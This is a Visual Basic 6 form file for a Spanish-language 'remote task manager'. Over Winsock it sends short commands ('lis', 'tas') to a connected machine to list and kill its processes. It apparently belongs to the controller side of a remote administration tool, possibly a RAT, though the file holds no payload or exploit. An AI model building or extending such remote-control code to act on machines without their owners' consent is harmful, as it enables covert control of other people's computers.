VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form procesos 
   Caption         =   "Administrador de tareas - Remoto"
   ClientHeight    =   8250
   ClientLeft      =   17250
   ClientTop       =   3075
   ClientWidth     =   8040
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   ScaleHeight     =   8250
   ScaleWidth      =   8040
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command3 
      Caption         =   "&Listar"
      Height          =   315
      Left            =   4920
      TabIndex        =   3
      Top             =   7800
      Width           =   975
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Cerrar"
      Height          =   315
      Left            =   7080
      TabIndex        =   2
      Top             =   7800
      Width           =   855
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   5520
      OleObjectBlob   =   "procesos.frx":0000
      Top             =   120
   End
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   5520
      Top             =   720
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Matar"
      Enabled         =   0   'False
      Height          =   315
      Left            =   6000
      TabIndex        =   1
      Top             =   7800
      Width           =   975
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   7575
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   7815
      _ExtentX        =   13785
      _ExtentY        =   13361
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      MousePointer    =   1
      NumItems        =   3
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Key             =   "a"
         Object.Tag             =   "a"
         Text            =   "Procesos"
         Object.Width           =   7938
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Key             =   "b"
         Object.Tag             =   "b"
         Text            =   "Nombre"
         Object.Width           =   4587
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Key             =   "c"
         Object.Tag             =   "c"
         Text            =   "PID"
         Object.Width           =   1482
      EndProperty
   End
End
Attribute VB_Name = "procesos"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
Dim vIndex As Variant
Dim Index_n As Integer
Dim seleccionado As String

Dim MyForm As FRMSIZE
Dim DesignX As Integer
Dim DesignY As Integer

Private Sub Command1_Click()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then

    seleccionado = ListView1.SelectedItem.Text
        
    Form1.Winsock1(vIndex(0)).SendData "tas" & seleccionado
    lista.List1.ListItems.Add , , "Cerrando [" & seleccionado & "]"
    ListView1.ListItems.Remove (ListView1.SelectedItem.Index)
    
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If

End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Command3_Click()
If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    ListView1.ListItems.Clear
    Form1.Winsock1(vIndex(0)).SendData "lis"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

If PathFileExists(App.path & "\sk\skin.skn") Then
    Skin1.LoadSkin App.path & "\sk\skin.skn"
    Skin1.ApplySkin procesos.hwnd
End If

Dim ScaleFactorX As Single, ScaleFactorY As Single

DesignX = 800
DesignY = 600
RePosForm = True
DoResize = False

Xtwips = Screen.TwipsPerPixelX
Ytwips = Screen.TwipsPerPixelY
Ypixels = Screen.Height / Ytwips
Xpixels = Screen.Width / Xtwips

ScaleFactorX = ((Xpixels / DesignX) / 2) - 100
ScaleFactorY = ((Ypixels / DesignY) / 2) - 100
ScaleMode = 1

Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
MyForm.Height = Me.Height
MyForm.Width = Me.Width

End Sub

Private Sub Form_Resize()
    Dim ScaleFactorX As Single, ScaleFactorY As Single

      If Not DoResize Then
         DoResize = True
         Exit Sub
      End If

      RePosForm = False
      ScaleFactorX = Me.Width / MyForm.Width
      ScaleFactorY = Me.Height / MyForm.Height
      Resize_For_Resolution ScaleFactorX, ScaleFactorY, Me
      MyForm.Height = Me.Height
      MyForm.Width = Me.Width
End Sub


Private Sub Form_Unload(Cancel As Integer)
Timer1.Enabled = False
End Sub

Private Sub LabelDegrade4_Change()

End Sub

Private Sub ListView1_ItemClick(ByVal Item As MSComctlLib.ListItem)
Command1.Enabled = True
End Sub

Private Sub Timer1_Timer()

If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    ListView1.ListItems.Clear
    Form1.Winsock1(vIndex(0)).SendData "lis"
Else
    lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
    Unload Me
End If

End Sub
